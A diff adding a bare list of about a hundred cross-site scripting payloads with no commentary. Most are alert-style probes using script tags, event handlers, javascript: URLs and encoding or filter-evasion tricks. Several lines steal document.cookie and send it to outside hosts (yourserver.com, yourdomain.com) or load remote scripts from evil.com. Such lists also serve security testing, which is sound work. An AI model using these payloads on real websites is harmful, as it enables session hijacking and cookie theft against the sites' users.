@@ -1,0 +1,116 @@
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+<script>alert(document.cookie)</script>
+"};alert('XSS');//
+?redirectUrl=javascript:alert(document.domain)
+?redirectUrl=javascript:alert(document.cookie)
+--%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
+/<svg onload=alert(1)>
+/"><svg onload=alert(1)>
+/<iframe src="javascript:alert(1)">
+/<script>alert(document.cookie)</script>
+-alert(1)-
+';prompt('XSS');//
+<h1 onauxclick=confirm(document.domain)>
+<img src=xss onerror=prompt('XSS')>
+"><img/src="x"/onerror=prompt(1)>
+[XXS](.alert(1);)
+"><svg/onload=alert('Bhavya')>
+">><img src=x onerror=confirm("Bhavya")>
+';alert('Bhavya')//
+';alertXSS;var%20x='
+</pre><isindex type=image src=1 onerror=alert(9166)><script>alert(origin)</script>
+"><img src=x onerror=alert(1)>
+"><svg/onload=alert(1)>"'><iframe/src=javascript:alert(1)>
+"><iframe srcdoc='<script>alert(1)</script>'>
+"><script>this.onerror=alert;throw 1</script>
+<script src="https://yourserver.com/payload.js"></script>
+<img src=x onerror="location='//yourserver.com?cookie='+document.cookie">
+';alert(1);//
+'**alert());//
+";alert(1);//
+');alert(1);//
+</script><script>alert(1)</script>
+<script src=//evil.com/xss.js></script>
+<input autofocus onfocus=alert(1)>
+<svg onload=top['al'+'ert']`1`>
+<svg/onload='alert`XSS`'>
+<details open ontoggle=confirm(1)>
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+"><svg onload=alert(1)>
+<svg/onload=alert(1)>
+');alert(1);// or ";alert(1);//
+<style>@import'javascript:alert(1)'</style>
+" onmouseover=alert(1) x="
+<img src=x onerror=alert(1)> and "><img src=x onerror=alert(1)>
+<script>fetch('https://yourdomain.com/log?cookie='+document.cookie)</script>
+"><svg onload=alert(1);>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+<script>
+var fn=window[490837..toString(1<<5)];
+<script>Reflect.construct(function(){new.target.constructor('alert(1)')()},[])</script>
+<link/rel=prefetch
+import href=data:q;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg>
+<link rel="import" href="data:x,<script>alert(1)</script>
+<script>Array.from`1${alert}3${window}2`</script>
+<script>!{x(){alert(1)}}.x()</script>
+<script>Array.from`${eval}alert\`1\``</script>
+<script>Array.from([1],alert)</script>
+<script>Promise.reject("1").then(null,alert)</script>
+<script src=data:,\u006fnerror=\u0061lert(1)></script>
+"><svg><script/xlink:href="data:,alert(1)
+<svg><script/xlink:href=data:,alert(1)></script>
+<frameset/onpageshow=alert(1)>
+<div onactivate=alert('Xss') id=xss style=overflow:scroll>
+<div onfocus=alert('xx') id=xss style=display:table>
+<img onerror="location='javascript:=lert(1)'" src="x">
+body{background:url("javascript:alert('xss')")}
+body{background:url(JavAs	cr	
+ipt:alert(0))}
+<style>@im\port'\ja\vasc\ript:alert("xss")';</style>
+<script/onreadystatechange=alert(1)>
+<script/src=data:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,alert(4)></script>
+<div style=width:1px;filter:glow onfilterchange=alert(1)>x
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<video><source onerror="alert(1)">
+<iframe srcdoc="<svg onload=alert(1)&nvgt;"></iframe>
+<frameset onload=alert(1)>
+<!--<img src="--><img src=x onerror=alert(1)//">
+<style><img src="</style><img src=x onerror=alert(1)//">
+<title><img src="</title><img src=x onerror=alert(1)//"> // by evilcos
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<frameset onpageshow="alert(1)">
+<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
+<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
+<iframe onLoad iframe onLoad="javascript:javascript:alert(1)"></iframe onLoad>
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
+<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
+\x3Cscript>javascript:alert(1)</script>
+'"`><script>/* *\x2Fjavascript:alert(1)// */</script>
+<script>javascript:alert(1)</script\x0D
+<script>javascript:alert(1)</script\x0A
+<script>javascript:alert(1)</script\x0B
+<script charset="\x22>javascript:alert(1)</script>
+<!--\x3E<img src=xxx:x onerror=javascript:alert(1)> -->
+--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->
+<a href="javascript\x3Ajavascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas\x0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
+<script>/* *\x2A/javascript:alert(1)// */</script>
+<script>/* *\x00/javascript:alert(1)// */</script>
+<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
+"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF 
+"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF 
+"/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />
+<script\x2F>javascript:alert(1)</script>
+<script\x09>javascript:alert(1)</script>
+`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
+<script>javascript:alert(1)<\x00/script>
+<img src=# onerror\x3D"javascript:alert(1)" >
+<input onfocus=javascript:alert(1) autofocus>
+<input onblur=javascript:alert(1) autofocus><input autofocus>
+<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
+<embed src="javascript:alert(1)">
